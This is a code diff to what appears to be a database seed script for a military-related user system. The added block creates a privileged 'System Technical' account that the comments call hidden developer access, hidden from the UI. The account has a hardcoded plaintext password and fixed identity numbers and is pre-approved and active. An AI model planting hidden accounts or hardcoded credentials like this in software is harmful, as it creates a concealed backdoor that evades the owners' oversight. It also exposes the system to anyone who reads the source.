@@ -118,6 +118,33 @@ async function main() {
   console.log('   3. Or import users via CSV');
   console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n');
 
+  // 4. Create SYSTEM_TECHNICAL user (hidden developer access)
+  console.log('\n🔧 Creating System Technical user...');
+
+  const systemTechPassword = await bcrypt.hash('parnasa2026S!', 10);
+
+  const systemTechUser = await prisma.user.upsert({
+    where: { personalId: '060196' },
+    update: {},
+    create: {
+      personalId: '060196',
+      fullName: 'System Technical',
+      email: 'system@yogev.idf',
+      phone: '0500000000',
+      passwordHash: systemTechPassword,
+      militaryRole: MilitaryRole.FIGHTER,
+      departmentId: dept0.id,
+      idNumber: '060196000',
+      isPreApproved: true,
+      isRegistered: true,
+      isActive: true,
+      role: UserRole.SYSTEM_TECHNICAL,
+      armyNumber: '060196',
+    },
+  });
+
+  console.log('✅ System Technical user created (hidden from UI)');
+
   // 5. Create sample messages
   console.log('\n💬 Creating sample messages...');
 
